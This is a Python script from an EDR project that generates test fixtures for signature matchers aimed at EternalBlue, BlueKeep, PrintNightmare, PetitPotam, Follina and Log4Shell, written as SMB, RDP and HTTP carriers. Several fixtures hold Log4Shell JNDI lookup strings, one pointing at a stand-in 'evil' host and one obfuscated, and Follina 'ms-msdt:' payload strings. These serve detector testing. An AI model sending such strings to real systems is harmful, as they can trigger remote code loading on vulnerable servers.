#!/usr/bin/env python3
"""
Emit synthetic protocol carriers that exercise the *builtin* known-exploit matchers
in shellcode_known.c (EternalBlue / BlueKeep / PrintNightmare / PetitPotam MS-EFSR
UUID / Follina ms-msdt / Log4Shell JNDI). These are NOT
weaponized exploits: they reproduce only the byte-level *signatures* described
in public write-ups, equivalent in spirit to test_shellcode.c fixtures.

Output: ../../test_data/shellcode_corpus/baselines/*.bin + manifest.tsv（当前 **43** 条数据行）
Run from repo:  python3 edr-agent/scripts/shellcode_corpus/emit_baseline_variants.py
After changing rules/parser/emit logic, run T-SC-000:  cmake --build <B> --target shellcode_t_sc_000_verify
  or:  bash edr-agent/scripts/shellcode_corpus/t_sc_000_verify.sh <B>

EternalBlue / BlueKeep carriers are prefixed so `edr_proto_find_shellcode_region` accepts them
(SMBv1: \\xffSMB + Trans/Trans2 command + 32-byte header; RDP: TPKT + X.224 connection request),
matching src/shellcode_detector/proto_parse.c — same bytes WinDivert pipeline scans after payload_off.

EternalBlue also emits NetBIOS session encapsulation (eternalblue_nb_*.bin): 0x00 + 3-byte BE length
of the SMB PDU (proto_parse uses off=4 when data[0]==0).
"""

from __future__ import annotations

import os

# Must match SMB1_HEADER_SIZE in proto_parse.c
_SMB1_HEADER_SIZE = 32

# EdrProtoKind (must match include/edr/proto_parse.h)
K_UNKNOWN = 0
K_SMB2 = 1
K_SMB1 = 2
K_RDP = 3
K_HTTP = 4

OUT_DIR = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "..", "..", "test_data", "shellcode_corpus", "baselines")
)


def w(path: str, data: bytes) -> None:
    os.makedirs(OUT_DIR, exist_ok=True)
    with open(os.path.join(OUT_DIR, path), "wb") as f:
        f.write(data)


def _smb1_trans_payload_carrier(payload: bytes, cmd: int = 0x25) -> bytes:
    """SMBv1 frame with payload after 32-byte header (proto_parse off=0; cmd whitelist in proto_parse.c)."""
    if cmd not in (0x25, 0x32, 0x71, 0xA2):
        cmd = 0x25
    hdr = bytearray(_SMB1_HEADER_SIZE)
    hdr[0:4] = b"\xffSMB"
    hdr[4] = cmd
    return bytes(hdr) + payload


def _rdp_tpkt_payload_carrier(payload: bytes) -> bytes:
    """7-byte TPKT + X.224 prefix per proto_parse (data[0]==3, data[1]==0, data[4]==2)."""
    total = 7 + len(payload)
    if total > 0xFFFF:
        total = 0xFFFF
    prefix = bytes([0x03, 0x00, (total >> 8) & 0xFF, total & 0xFF, 0x02, 0x00, 0x00])
    return prefix + payload


def _netbios_session_message_wrap(smb_pdu: bytes) -> bytes:
    """NetBIOS session message: 0x00 + 24-bit big-endian length of following SMB bytes (see proto_parse off=4)."""
    n = len(smb_pdu)
    if n > 0xFFFFFF:
        n = 0xFFFFFF
    return bytes([0x00, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF]) + smb_pdu


def eternalblue_variants() -> list[tuple[str, bytes]]:
    k_dp = bytes([0x81, 0xF1, 0x13, 0x00, 0x00, 0x00, 0x49])
    k_tail = bytes([0x05, 0x00])
    rows: list[tuple[str, bytes]] = []
    # v00: minimal subseq — DoublePulsar only (same idea as test_shellcode.c)
    b0 = bytearray(96)
    b0[40:47] = k_dp
    rows.append(("eternalblue_v00.bin", bytes(b0)))
    # v01: long zero run + 05 00 tail (branch 2)
    b1 = bytearray(128)
    for i in range(48):
        b1[i] = 0x00
    b1[100:102] = k_tail
    rows.append(("eternalblue_v01.bin", bytes(b1)))
    # v02: leading noise + DoublePulsar + trailing sled
    b2 = bytearray(120)
    for i in range(16):
        b2[i] = 0xCC
    b2[32:39] = k_dp
    for i in range(80, 120):
        b2[i] = 0x90
    rows.append(("eternalblue_v02.bin", bytes(b2)))
    # v03: DoublePulsar appears twice (still one subseq match)
    b3 = bytearray(160)
    b3[10:17] = k_dp
    b3[100:107] = k_dp
    rows.append(("eternalblue_v03.bin", bytes(b3)))
    # v04: zero-run 32 + tail 05 00 early + more data (branch 2 layout stress)
    b4 = bytearray(200)
    for i in range(32):
        b4[8 + i] = 0x00
    b4[50:52] = k_tail
    for i in range(120, 200):
        b4[i] = (i * 17) & 0xFF
    rows.append(("eternalblue_v04.bin", bytes(b4)))
    # Framed for pipeline / WinDivert: v00 uses Trans (0x25), v01–v04 use Trans2 (0x32) for variety.
    out: list[tuple[str, bytes]] = []
    cmds = (0x25, 0x32, 0x32, 0x32, 0x32)
    for i, ((name, raw), cmd) in enumerate(zip(rows, cmds)):
        out.append((name, _smb1_trans_payload_carrier(raw, cmd=cmd)))
    return out


def eternalblue_netbios_variants() -> list[tuple[str, bytes]]:
    """Same SMB-on-wire as eternalblue_v*.bin, prefixed with NetBIOS session header (data[0]==0)."""
    out: list[tuple[str, bytes]] = []
    for name, smb_framed in eternalblue_variants():
        nb_name = name.replace("eternalblue_", "eternalblue_nb_", 1)
        out.append((nb_name, _netbios_session_message_wrap(smb_framed)))
    return out


def bluekeep_variants() -> list[tuple[str, bytes]]:
    ms = b"MS_T120"
    k_ab = bytes([0x1F, 0x00])
    rows: list[tuple[str, bytes]] = []
    # v00: minimal (same shape as test_shellcode.c)
    b0 = bytearray(96)
    b0[0:7] = ms
    b0[20:22] = k_ab
    for i in range(32):
        b0[40 + i] = 0x41
    rows.append(("bluekeep_v00.bin", bytes(b0)))
    # v01: padding before MS_T120
    b1 = bytearray(128)
    for i in range(24):
        b1[i] = 0x11
    b1[24:31] = ms
    b1[48:50] = k_ab
    for i in range(70, 86):
        b1[i] = 0x41
    rows.append(("bluekeep_v01.bin", bytes(b1)))
    # v02: MS_T120 then extra ASCII then markers
    b2 = bytearray(160)
    b2[0:7] = ms
    b2[7:20] = b"JUNKJUNKJUNK"
    b2[40:42] = k_ab
    for i in range(60, 90):
        b2[i] = 0x41
    rows.append(("bluekeep_v02.bin", bytes(b2)))
    # v03: longer 0x41 run (>=16)
    b3 = bytearray(200)
    b3[10:17] = ms
    b3[30:32] = k_ab
    for i in range(100, 140):
        b3[i] = 0x41
    rows.append(("bluekeep_v03.bin", bytes(b3)))
    # v04: MS_T120 duplicated in buffer (subseq still finds)
    b4 = bytearray(180)
    b4[5:12] = ms
    b4[80:87] = ms
    b4[100:102] = k_ab
    for i in range(120, 140):
        b4[i] = 0x41
    rows.append(("bluekeep_v04.bin", bytes(b4)))
    return [(name, _rdp_tpkt_payload_carrier(raw)) for name, raw in rows]


def printnightmare_variants() -> list[tuple[str, bytes]]:
    """Matcher requires all three byte patterns as *subsequences* (any order, any spacing)."""
    k_op = bytes([0x59, 0x00, 0x00, 0x00])
    k_unc = bytes([0x5C, 0x00, 0x5C, 0x00])
    k_uuid = bytes(
        [
            0x12,
            0x34,
            0x56,
            0x78,
            0x12,
            0x34,
            0xAB,
            0xCD,
            0xEF,
            0x00,
            0x01,
            0x23,
            0x45,
            0x67,
            0x89,
            0xAB,
        ]
    )
    junk = bytes((i * 17 + 3) & 0xFF for i in range(120))
    # v00: compact U+O+N
    v0 = k_uuid + k_op + k_unc + bytes(16)
    # v01: large high-entropy prefix + U+O+N (padding stress)
    v1 = bytes((i * 31 + 5) & 0xFF for i in range(400)) + k_uuid + k_op + k_unc
    # v02: permuted scatter O — U — N with gaps
    v2 = k_op + junk + k_uuid + junk[:80] + k_unc
    # v03: N — U — O
    v3 = k_unc + bytes(200) + k_uuid + bytes(50) + k_op
    # v04: duplicate UNC + UUID twice (still matches subseq checks)
    v4 = k_uuid + bytes(30) + k_op + k_unc + bytes(8) + k_unc + k_uuid + bytes(24)
    return [
        ("printnightmare_v00.bin", v0),
        ("printnightmare_v01.bin", v1),
        ("printnightmare_v02.bin", v2),
        ("printnightmare_v03.bin", v3),
        ("printnightmare_v04.bin", v4),
    ]


EFSR_UUID = bytes.fromhex("c681d488d85011d08c5200c04fd90f7e")


def petitpotam_variants() -> list[tuple[str, bytes]]:
    rows: list[tuple[str, bytes]] = []
    b0 = bytearray(80)
    b0[0:16] = EFSR_UUID
    rows.append(("petitpotam_v00.bin", bytes(b0)))
    b1 = bytearray(220)
    for i in range(100):
        b1[i] = (i * 19 + 7) & 0xFF
    b1[100:116] = EFSR_UUID
    rows.append(("petitpotam_v01.bin", bytes(b1)))
    b2 = bytearray(180)
    b2[30:46] = EFSR_UUID
    for i in range(46, 180):
        b2[i] = 0x90
    rows.append(("petitpotam_v02.bin", bytes(b2)))
    b3 = bytearray(100)
    b3[0:16] = EFSR_UUID
    b3[50:66] = EFSR_UUID
    rows.append(("petitpotam_v03.bin", bytes(b3)))
    b4 = bytearray(120)
    for i in range(0, 104):
        b4[i] = 0xCC
    b4[104:120] = EFSR_UUID
    rows.append(("petitpotam_v04.bin", bytes(b4)))
    return rows


def _http_carrier(body: bytes) -> bytes:
    hdr = (
        b"POST /a HTTP/1.1\r\nHost: t\r\nContent-Length: "
        + str(len(body)).encode("ascii")
        + b"\r\n\r\n"
    )
    return hdr + body


def _smb2_payload_carrier(payload: bytes, command: int) -> bytes:
    """SMB2: 64-byte header + command (LE @12) + payload (T-SC-011 carriers)."""
    b = bytearray(64 + len(payload))
    b[0:4] = b"\xfeSMB"
    b[12] = command & 0xFF
    b[13] = (command >> 8) & 0xFF
    b[64:] = payload
    return bytes(b)


def eternalblue_smb1_cmd_extras() -> list[tuple[str, bytes]]:
    """SMB1 TreeConnectAndX / NT Create AndX framing + same EternalBlue marker payload as v00."""
    k_dp = bytes([0x81, 0xF1, 0x13, 0x00, 0x00, 0x00, 0x49])
    raw = bytearray(96)
    raw[40:47] = k_dp
    p = bytes(raw)
    return [
        ("eternalblue_smb1_cmd71_v00.bin", _smb1_trans_payload_carrier(p, cmd=0x71)),
        ("eternalblue_smb1_cmda2_v00.bin", _smb1_trans_payload_carrier(p, cmd=0xA2)),
    ]


def petitpotam_smb2_cmd_carriers() -> list[tuple[str, bytes]]:
    """PetitPotam IOC after SMB2 header: pipeline parse_ok + kind SMB2 (T-SC-011)."""
    body = bytearray(80)
    body[0:16] = EFSR_UUID
    p = bytes(body)
    return [
        ("petitpotam_smb2_sess01.bin", _smb2_payload_carrier(p, 0x0001)),
        ("petitpotam_smb2_create05.bin", _smb2_payload_carrier(p, 0x0005)),
    ]


def follina_http_edge_variants() -> list[tuple[str, bytes]]:
    """T-SC-031: case-insensitive method, chunked body, mixed-case header line."""
    bod = b"https://q?ms-msdt:/x"
    v0 = (
        b"post /a HTTP/1.1\r\nHoSt: t\r\nContent-Length: "
        + str(len(bod)).encode("ascii")
        + b"\r\n\r\n"
        + bod
    )
    chunk = b"ms-msdt:/evil"
    te = (
        b"POST /a HTTP/1.1\r\nHost: t\r\nTransfer-Encoding: chunked\r\n\r\n"
        + f"{len(chunk):x}".encode("ascii")
        + b"\r\n"
        + chunk
        + b"\r\n0\r\n\r\n"
    )
    bod2 = b"MS-MSDT:/x"
    v2 = (
        b"POST /a HTTP/1.1\r\nHost: t\r\nContent-Length: "
        + str(len(bod2)).encode("ascii")
        + b"\r\n\r\n"
        + bod2
    )
    return [("follina_http_lower_v00.bin", v0), ("follina_http_chunked_v00.bin", te), ("follina_http_mixedcase_v00.bin", v2)]


def log4shell_http_edge_variants() -> list[tuple[str, bytes]]:
    bod = b"${jndi:ldap://127.0.0.1/a}"
    v0 = (
        b"POST /a HTTP/1.1\r\nHoSt: t\r\nContent-Length: "
        + str(len(bod)).encode("ascii")
        + b"\r\n\r\n"
        + bod
    )
    return [("log4shell_http_lower_v00.bin", v0)]


def follina_variants() -> list[tuple[str, bytes]]:
    bodies = [
        b"word/ms-msdt:/../../../../x",
        b"https://x/?q=ms-msdt:%20...",
        (b"padding" * 20) + b"ms-msdt:!base/...",
        b"ms-msdt:" + (b"X" * 64),
        b"a\r\n\r\nms-msdt:/...",
    ]
    return [(f"follina_v0{i}.bin", _http_carrier(b)) for i, b in enumerate(bodies)]


def log4shell_variants() -> list[tuple[str, bytes]]:
    bodies = [
        b"${jndi:ldap://127.0.0.1/a}",
        b"${jndi:rmi://evil/x}",
        b"${jndi:dns://d.tld/x}",
        b"${${::-j}ndi:${::-l}dap://x/y}",
        (b"abc" * 30) + b"${jndi:ldap://h/n}",
    ]
    return [(f"log4shell_v0{i}.bin", _http_carrier(b)) for i, b in enumerate(bodies)]


def main() -> int:
    manifest: list[str] = []
    for name, data in eternalblue_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_SMB1}\tEternalBlue_MS17_010")
    for name, data in eternalblue_netbios_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_SMB1}\tEternalBlue_MS17_010")
    for name, data in bluekeep_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_RDP}\tBlueKeep_CVE_2019_0708")
    for name, data in printnightmare_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_SMB2}\tPrintNightmare_CVE_2021_34527")
    for name, data in petitpotam_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_SMB2}\tPetitPotam_MS_EFSR")
    for name, data in petitpotam_smb2_cmd_carriers():
        w(name, data)
        manifest.append(f"{name}\t{K_SMB2}\tPetitPotam_MS_EFSR")
    for name, data in eternalblue_smb1_cmd_extras():
        w(name, data)
        manifest.append(f"{name}\t{K_SMB1}\tEternalBlue_MS17_010")
    for name, data in follina_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_HTTP}\tFollina_CVE_2022_30190")
    for name, data in follina_http_edge_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_HTTP}\tFollina_CVE_2022_30190")
    for name, data in log4shell_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_HTTP}\tLog4Shell_CVE_2021_44228")
    for name, data in log4shell_http_edge_variants():
        w(name, data)
        manifest.append(f"{name}\t{K_HTTP}\tLog4Shell_CVE_2021_44228")

    man_path = os.path.join(OUT_DIR, "manifest.tsv")
    with open(man_path, "w", encoding="utf-8") as f:
        f.write("# file\tproto_kind\texpected_rule_name\n")
        for line in manifest:
            f.write(line + "\n")
    print("Wrote", len(manifest), "samples under", OUT_DIR)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
